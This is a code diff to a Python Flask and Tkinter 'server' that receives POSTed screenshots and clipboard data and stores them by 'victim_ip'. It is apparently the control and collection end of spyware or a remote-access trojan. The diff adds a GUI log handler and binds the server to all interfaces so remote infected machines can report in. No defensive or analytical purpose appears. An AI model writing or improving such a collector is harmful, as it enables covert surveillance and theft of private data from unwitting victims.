@@ -6,7 +6,7 @@ import os
 from datetime import datetime
 from flask import Flask, request, jsonify
 import tkinter as tk
-from tkinter import scrolledtext, ttk, messagebox
+from tkinter import scrolledtext, ttk
 
 # Flask app setup
 app = Flask(__name__)
@@ -25,6 +25,19 @@ os.makedirs(screenshots_dir, exist_ok=True)
 
 # Flag for logging clipboard data
 show_clipboard_in_logs = True
+
+class GUIHandler(logging.Handler):
+    def __init__(self, log_widget):
+        super().__init__()
+        self.log_widget = log_widget
+
+    def emit(self, record):
+        try:
+            msg = self.format(record)
+            self.log_widget.insert(tk.END, msg + '\n')
+            self.log_widget.yview(tk.END)
+        except Exception:
+            self.handleError(record)
 
 @app.route('/', methods=['POST'])
 def handle_post():
@@ -73,7 +86,7 @@ def save_screenshot(base64_data, victim_ip):
         file.write(image_data)
 
 def run_flask():
-    app.run(port=8080)
+    app.run(host='0.0.0.0', port=8080, debug=False, use_reloader=False)
 
 # GUI Setup
 class ServerGUI:
@@ -92,6 +105,13 @@ class ServerGUI:
 
         self.log_text = scrolledtext.ScrolledText(self.log_frame, width=70, height=20, wrap=tk.WORD)
         self.log_text.pack(padx=10, pady=10, fill='both', expand=True)
+
+        # Set up GUI logging handler
+        self.gui_handler = GUIHandler(self.log_text)
+        self.gui_handler.setLevel(logging.INFO)
+        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
+        self.gui_handler.setFormatter(formatter)
+        logger.addHandler(self.gui_handler)  # Add the GUI handler to the root logger
 
         # Control Tab
         self.control_frame = ttk.Frame(self.notebook)
@@ -120,8 +140,6 @@ class ServerGUI:
 
     def stop_server(self):
         if self.server_running:
-            # Flask server does not have a built-in way to stop it gracefully
-            # This is a placeholder for actual implementation
             self.server_running = False
             self.start_button.config(state=tk.NORMAL)
             self.stop_button.config(state=tk.DISABLED)
@@ -134,8 +152,8 @@ class ServerGUI:
         self.log(f"Clipboard logging {status}.")
 
     def log(self, message):
-        self.log_text.insert(tk.END, message + '\n')
-        self.log_text.yview(tk.END)
+        # Directly emit log to the GUI
+        self.gui_handler.emit(logging.LogRecord(name='root', level=logging.INFO, pathname='', lineno=0, msg=message, args=None, exc_info=None))
 
 # Initialize GUI
 root = tk.Tk()
